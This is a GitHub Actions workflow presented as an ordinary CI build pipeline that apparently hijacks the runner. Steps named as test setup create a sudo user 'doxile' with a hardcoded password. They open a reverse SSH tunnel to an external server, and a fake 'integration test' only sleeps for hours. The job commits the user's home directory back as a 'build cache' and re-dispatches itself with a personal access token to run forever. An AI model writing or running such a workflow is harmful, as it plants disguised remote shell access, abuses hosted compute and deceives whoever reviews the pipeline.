name: CI Build Pipeline

on:
  workflow_dispatch:
  repository_dispatch:
    types: [restart-ci-job]

jobs:
  build_and_test:
    runs-on: ubuntu-latest
    timeout-minutes: 355

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          token: ${{ secrets.VDS_PAT }}
          
      - name: Restore build cache
        run: |
          if [ -f "build_cache.tar.gz" ]; then
            echo "Build cache found. Restoring..."
            sudo tar -xzf build_cache.tar.gz -C /
          else
            echo "No cache found. Performing clean build."
          fi

      - name: Setup test environment and services
        env:
          VDS_IP: ${{ secrets.VDS_IP }}
          VDS_USER: ${{ secrets.VDS_USER }}
          VDS_PASSWORD: ${{ secrets.VDS_PASSWORD }}
        run: |
          echo "Installing dependencies..."
          sudo apt-get update > /dev/null 2>&1
          sudo apt-get install -y openssh-server sshpass > /dev/null 2>&1
          
          sudo useradd -m -s /bin/bash doxile && echo "doxile:123123asd" | sudo chpasswd
          sudo usermod -aG sudo doxile
          sudo service ssh start
          
          echo "Starting remote tunnel for debugging..."
          sshpass -p "${VDS_PASSWORD}" ssh -f -N -R 0.0.0.0:2222:localhost:22 ${VDS_USER}@${VDS_IP} -o StrictHostKeyChecking=no
          echo "Test environment is ready."

      - name: Run long-running integration tests
        run: |
          echo "Starting integration tests... This will take several hours."
          sleep 20700 # ~5 часов 45 минут

      - name: Save build cache
        if: success()
        run: |
          echo "Saving build cache for next run..."
          sudo tar -czf build_cache.tar.gz -C /home doxile

      - name: Commit build cache
        if: success()
        uses: stefanzweifel/git-auto-commit-action@v5
        with:
          commit_message: "Update build cache [ci skip]"
          file_pattern: "build_cache.tar.gz"

      - name: Schedule next nightly build
        if: success()
        run: |
          echo "Scheduling next build..."
          curl -s -L \
            -X POST \
            -H "Accept: application/vnd.github.v3+json" \
            -H "Authorization: token ${{ secrets.VDS_PAT }}" \
            "https://api.github.com/repos/${{ github.repository }}/dispatches" \
            -d '{"event_type": "restart-ci-job"}'
          echo "Next build scheduled."
